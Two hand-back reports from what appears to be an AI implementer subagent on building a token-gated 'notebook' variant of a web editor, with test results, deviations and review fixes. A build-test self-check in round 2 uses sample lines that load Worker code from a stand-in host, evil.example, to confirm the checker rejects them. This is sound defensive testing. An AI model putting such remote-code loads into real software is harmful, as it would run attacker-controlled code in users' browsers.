# T162 report — round 1

(From the implementer subagent's hand-back; saved by the reviewer, because the
harness refuses a subagent's write of a `.md` file.)

## Summary

This adds the notebook build of the web editor. `VITE_AUTO_CANVAS_AUTH=notebook` (honoured only by `vite build`) defines `import.meta.env.ICM_NOTEBOOK`, and `main.tsx` then mounts `entries/notebook.tsx` instead of the standard entry. The notebook entry first establishes the silicon-notebook session: it reads the `localStorage` token and calls `GET api/auth/me` with the bearer. Only then does it load `App` and the services. It installs a page-wide `fetch` that adds the token to exactly the deployment's API requests, and mounts the editor with the Agent off. After a token change, a missing or unreadable token, or a 401, it revokes that fetch, unmounts the editor, shows an account-changed screen and reloads. Previews in the notebook build are fetched through that fetch and shown from object URLs (`notebook/api-image.tsx`), which loads lazily at the two call sites. The standard build's output is byte-identical to the base. `pnpm build:notebook-editor` writes `apps/editor/dist-notebook/`. `scripts/notebook-editor-build.test.mjs` proves both builds' properties, and `docs/specs/server.md` gains "The editor in notebook mode".

## Steps

| Step | Status | Notes |
| --- | --- | --- |
| 1 | done | `notebookBuildSwitch` plugin in `apps/editor/vite.config.ts` (config is still an object); `ImportMetaEnv.ICM_NOTEBOOK` in `src/vite-env.d.ts` |
| 2 | done | `src/main.tsx` as specified |
| 3 | done | `src/notebook/session.ts` (`TOKEN_KEY`, `readToken`, `identify`) |
| 4 | done | `src/notebook/scoped-fetch.ts`; an unparseable URL passes through untouched |
| 5 | done with deviation | The static import did not fold (CJS interop requires stayed), so the call sites use `lazy(() => import(...))` behind the constant, per the plan's fallback. React `lazy` rather than `lazyChunk`, because `lazyChunk`'s import changed the standard chunk graph. A failed chunk renders nothing. A stale response is never read into a blob. |
| 6 | done | `src/notebook/gate.ts` (state machine, `observeSessionEvents`), `src/notebook/screens.ts`, `src/entries/notebook.tsx`. Not specified by the plan: Retry also on the unreadable-storage screen; a token change on the signed-out or error screen starts a new run; `installFetch` throws on a second call; the entry imports `styles.css` |
| 7 | done | revoke → unmount → account-changed screen → reload, once and synchronously |
| 8 | done | root `build:notebook-editor` script, `.gitignore` line, `docs/specs/server.md` subsection |
| 9 | done | Fresh config through query-string import (`loadConfigFromFile` fails under Vitest); `NODE_ENV` unset during builds; worker imports read with `vite.parseAst`; chunk imports checked for locality only (a removed pure-CSS chunk stays listed) |
| 10 | done | session, scoped-fetch, api-image, gate tests; plus `screens.test.ts` |

## Review findings addressed

None (round 1).

## Acceptance results

```text
pnpm install --frozen-lockfile --offline → 0; Already up to date
pnpm build → 0; apps/editor build: Done
pnpm exec vitest run apps/editor/src/notebook scripts/notebook-editor-build.test.mjs → 0; Test Files 6 passed (6), Tests 51 passed (51)
pnpm test:local → 0; Test Files 849 passed | 3 skipped (852), Tests 8810 passed | 117 skipped (8927)
pnpm build:notebook-editor → 0
test -f apps/editor/dist-notebook/index.html && grep -c '/canvas/assets/' … → 8
grep -rl silicon_notebook_token apps/editor/dist | wc -l → 0
grep -rl silicon_notebook_token apps/editor/dist-notebook | wc -l → 1
find apps/editor/dist apps/editor/dist-notebook -path '*@notebook*' | wc -l → 0
git diff --stat main -- apps/editor/src (exclusions) → lists T150 files because the local main ref (e97b188) is behind origin/main (387a3de); against origin/main and HEAD: empty
git diff --stat main -- apps/editor/e2e playwright.config.ts apps/server packages → same stale ref; against HEAD: empty; against origin/main: only the 16 apps/server files committed by the T161 base
pnpm typecheck && pnpm lint && pnpm format:check && pnpm docs:check → 0; oxlint 0 errors; Prettier clean; links valid in 75 files
pnpm test:e2e:local (ICM_E2E_PORT=4273, AUTO_CANVAS_E2E_API_PORT=4321) → 1; Playwright stops loading: TypeError reading 'BASE_URL' at src/components/site-resource-links.ts:10, through e2e/project-file.spec.ts → cloud-projects → request-failure → usage-policy-note → site-resource-links (all unchanged; the chain exists at HEAD)
pnpm exec playwright test <the 53 other spec files> (same ports) → 0; 449 passed, 2 skipped (17.5m)
```

## Investigation results

- **Step 1, constant folding.** The `main.tsx` branch folds in both builds. The static `ApiImage` import at the call sites does not: rolldown rendered `var import_react = require_react(); var import_jsx_runtime = require_jsx_runtime();` from `api-image.tsx` into the standard shelf-wall chunk. A `lazyChunk` import changed the standard chunk graph (`cloud-project-session` merged, `dist-*` split differently). With React `lazy`, a standard build of the base files and of this task's files are identical (`diff -rq`: no differences, including `index.html` and `sw.js`). The notebook index chunk keeps unused shared definitions from `entries/web.tsx` (account.tsx). Its only top-level statements are the modulepreload polyfill, the style init and the dynamic import of the notebook chunk.
- **Step 6, Agent reads.** No read of `icm.agent-session-recovery.v1` and no `api/agent/…` request is reachable with `capabilities.agent: false` and `publicAgentUiEnabled={false}`:
  - `WorkspaceAgentOwner` neededOnLoad and the `?agent=pair` pairing check `enabled`.
  - `useAgentStartupRecovery` checks `capabilities.agent`.
  - The reads in `use-agent-session.ts` and all Agent requests are in the agent-runtime chunk, which loads only through `WorkspaceAgentOwner`; `requestConnection` returns early when not enabled.
  - The Agent UI is gated by `publicAgentUiEnabled`, and `ComponentAgentControls` gets a null session.
  - The code is still emitted, for example `session-recovery` in the shared `netlist-code-edit` chunk. No browser check yet (T162b).
- **Step 9, computed targets** (notebook build). Literal: the auto-layout worker in App, the RNL worker in the RNL client, the RNL wasm in the RNL worker asset, all `/canvas/assets/…` with `` ``+import.meta.url ``. Computed, once each:
  - preload helper: `import.meta.resolve?import.meta.resolve(e):new URL(e,import.meta.url).href`, base `function(e){return`/canvas/`+e}`;
  - RNL browser: `:new Worker(new URL(n,import.meta.url),{type:`module`})`;
  - RNL Node: `=new o(new URL(n??`./worker.js`,import.meta.url))`.

  The RNL worker asset imports `./rolldown-runtime-….js` statically and `./__vite-browser-external-….js` dynamically. The test pins these shapes occurrence by occurrence, with identifier wildcards.

## Deviations and open questions

- Step 5 uses the lazy form, as above. A preview whose chunk fails to load shows nothing; TilePreview's placeholder is not shown in that case.
- Plan facts that did not hold: the static-import folding, the local `main` ref used by the acceptance diffs, and the full e2e suite passing unchanged.
- `pnpm test:e2e:local` is blocked by `e2e/project-file.spec.ts`, which fails before this task's changes, at module load through `site-resource-links.ts:10`. It needs its own fix, outside this task's scope.
- The mutation check for the pre-commit re-read was not run: the environment refused the temporary edit. The test asserts that nothing is installed when the token changes with no event.
- The display name and a way back to silicon-notebook remain deferred to the owner, as the plan says.

# T162 report — round 2

(From the implementer subagent's hand-back; saved by the reviewer.)

All five findings of review round 2 (6–10) are fixed.

## Acceptance (with `VITE_AUTO_CANVAS_AUTH` unset)
- `pnpm build`: pass (exit 0)
- `pnpm exec vitest run apps/editor/src/notebook scripts/notebook-editor-build.test.mjs`: pass, 8 files, 62 tests
- `pnpm test:local`: pass, 851 files passed and 3 skipped; 8821 tests passed and 117 skipped
- `pnpm build:notebook-editor`: pass (exit 0); `index.html` has 8 `/canvas/assets/` references
- `silicon_notebook_token` files: 0 in `apps/editor/dist`, 1 in `apps/editor/dist-notebook`
- paths containing `@notebook` in either output: 0
- The two `git diff --stat` commands against `7432d01e15f8` (the merge base with `origin/task/T161-notebook-identity`): both empty
- `pnpm typecheck`, `pnpm lint`, `pnpm format:check`, `pnpm docs:check`: all exit 0. The first typecheck failed on a type error I introduced (described under finding 7); it was fixed and the checks rerun.

## Findings
- **6 (`main.tsx`):** If the notebook entry chunk fails to load, a rejection handler now builds a small screen with plain DOM in `#root`. It has `data-testid="notebook-error"`, `role="alert"`, one sentence asking the user to reload, and a Reload button that calls `location.reload()`. The handler imports no module and sits only inside the `ICM_NOTEBOOK` branch. The new test `notebook/main-entry.test.ts` turns the switch on with `vi.stubEnv`, makes `../entries/notebook` fail and `../entries/web` a stub, then checks the screen and that the standard mount was not called.
- **7 (`api-image.tsx`):** With `loading="lazy"` and `IntersectionObserver` available, the component now shows a placeholder and observes it with `rootMargin: "100% 0px"` (one viewport height). The fetch starts on the first intersecting entry, which also disconnects the observer. Unmount and `src` changes disconnect it too.
  - Eager images, and pages without `IntersectionObserver`, fetch at once.
  - New tests with a fake observer cover: no fetch before intersection, exactly one after it (including a stray second report), none after unmount, an eager image fetched at once, the no-observer fallback, and that the placeholder keeps the image's attributes. The existing tests now expect the placeholder where they expected an empty render.
  - `ApiImage` now declares its return type as `ReactElement | null`. Without it, `tile-preview`'s lazy fallback `() => null` stopped type-checking; this kept `tile-preview.tsx` unchanged.
- **8 (build test Worker check):** The checker is now a pure function, `codeTargetProblems(sources)`, that returns a list of problems. A `new Worker(` or `new SharedWorker(` is accepted only when its first argument starts at an accepted `new URL(…, import.meta.url)` and ends right after it (the next character is `,` or `)`). Accepted means a literal target that resolves under `/canvas/`, or a recorded computed exception matched occurrence by occurrence.
  - The real build still passes: no problems, and each computed shape found exactly once.
  - A new self-check runs the checker over a synthetic chunk with one valid Worker, `new Worker(new URL("https://evil.example/w.js", document.baseURI))` and `new Worker("https://evil.example/w.js")`. It reports exactly the two bad ones.
- **9 (`version-history-dialog.tsx`, `api-image.tsx`):** While loading and after a failure, `ApiImage` renders a placeholder `<img>` with no `src`, the caller's attributes, `alt=""` and `aria-hidden="true"`. The CSS selects `.version-row img` by tag, so the existing rules size it.
  - In the dialog's notebook branch, the `Suspense` fallback and the chunk-load-failure component now render the same kind of `<img>`, so the preview cell is never empty. The standard `<img>` branch is untouched and no CSS changed.
  - I checked in headless Chrome that an `<img>` with no `src` and `alt=""` takes the CSS size (112×76 including border in a 110px grid column) and that `width`/`height` attributes give it an aspect ratio.
  - New test `notebook/version-history-preview.test.tsx` (switch on): the row's first child is a source-less `<img>` while loading and after a 404, with `version-copy` next to it; after success it is the blob-backed image.
- **10 (`screens.ts`):** `showGateScreen` takes an optional fourth parameter, `reload` (default: the document's `location.reload()`). With a retry callback the error screen is unchanged. Without one it says "The canvas could not start. Reload the page to try again." and shows a single Reload button. A new test covers both variants and that each button calls only its own callback.
- **Docs:** `docs/specs/server.md` (an owned path) gained two sentences: the reload message when the entry or the mount fails, and lazy previews with their placeholder.

## Identity proof
1. Built the current tree: `pnpm --filter @icm/editor exec vite build --outDir $PWD/tmp/id/head --emptyOutDir`.
2. Backed up the five shared files (`main.tsx`, `vite-env.d.ts`, `tile-preview.tsx`, `version-history-dialog.tsx`, `vite.config.ts`) and replaced each with `git show origin/main:<path> > <path>`. `git diff --stat origin/main` on those five files was then empty.
3. Built again to `tmp/id/base` with the same command.
4. Restored the backups. `git diff --stat origin/main` on the five files shows the round-2 versions again.
5. `diff -rq tmp/id/base tmp/id/head` exited 0, with 194 files on each side.

The later `ApiImage` type-only edit touches only `src/notebook/`, which the build test confirms is not rendered into the standard output. The build test's "no notebook module" assertions still pass.

## Playwright (standard build)
`ICM_E2E_PORT=4273 AUTO_CANVAS_E2E_API_PORT=4321 AUTO_CANVAS_TEST_DATABASE_URL=postgresql:///auto_canvas_test_2 pnpm exec playwright test apps/editor/e2e/project-tabs.spec.ts apps/editor/e2e/cloud-projects-server.spec.ts apps/editor/e2e/base-path.spec.ts`: 23 passed in 1.2 minutes.
- The first two are the only spec files that use the `shelf-*` or `version-*` test ids.
- `base-path.spec.ts` was added because it tests the editor under a base path.
- `project-file.spec.ts` was not run, as instructed.

## Deviations or blockers
None. The temporary output directories under `tmp/` were removed; `apps/editor/dist-notebook` remains (it is git-ignored).
